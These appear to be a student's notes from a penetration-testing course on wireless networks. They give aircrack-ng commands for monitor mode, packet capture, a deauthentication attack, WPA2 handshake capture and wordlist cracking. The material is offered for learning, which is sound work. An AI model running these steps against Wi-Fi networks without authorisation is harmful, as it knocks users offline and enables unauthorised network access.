### Wireless Pentesting

#### WPA2 PSK

Pretty much what most everyone uses at home, small business.  PSK = Pre-Shared Key (i.e., password)

#### WPA2 Enterprise

This is what most enterprises use.  Uses RADIUS or some form of credentials to log into the network.

This is not covered so much in this course as the labs and setup would be an undertaking all it's own.  Definitely look at it.  Guy teaching this course learned it from a blog post.

#### Pentest Activities performed

Evaluating strength of PSK  
Reviewing nearby networks  
Assessing guest networks  
Checking network access  

#### The process

1: Place wireless card into monitor mode  
&ensp;This allows us to sit and capture packets.  
&ensp;&ensp;`airmon-ng check kill`   - this will check for processes that will interfere with what we want to do and kill those processes.  
&ensp;&ensp;`airmon-ng start wlan0`   - wlan9 is the name of the interface (found with `iwconfig`)  
&ensp;&ensp;`airodump-ng wlan0mon`   - This will show all the nearby SSID's  
2: Discover information about network  
&ensp;Channel - Should read more on this.  
&ensp;BSSID - MAC address of an access point  
3: Select network and capture data  
&ensp;`airodump-ng -c 6 --bssid <mac address> -w capture wlan0mon`  
&ensp;&ensp;This will capture from channel 6 with the BSSID of the needed mac address (copy and paste in).  It will then write what it grabs to the `capture` file and use interface `wlan0mon`.  
4: Perform deauth attack  
&ensp;`aireplay-ng -0 1 -a <mac address from the ap> -c <station mac address> wlan0mon`  
&ensp;&ensp;-0 means deauth attack.  1 means we're running it 1 time.  -a MAC address from the AP gather from the `airodump-ng` command.  `-c <station mac address>` you should have from the capture.  And then the interface `wlan0mon`  
5: Capture WPA handshake  
&ensp;You should have your scan running from step 3, you will see it pop up that it grabbed a handshake.  
6: Attempt to crack the handshake  
&ensp;`aircrack-ng -w wordlist.txt -b <BSSID> capture-02.cap`  
&ensp;&ensp;-w is your wordlist to check against.  -b is the BSSID.  capture-02.cap is the capture file (the one you got the message about grabbing the handshake)
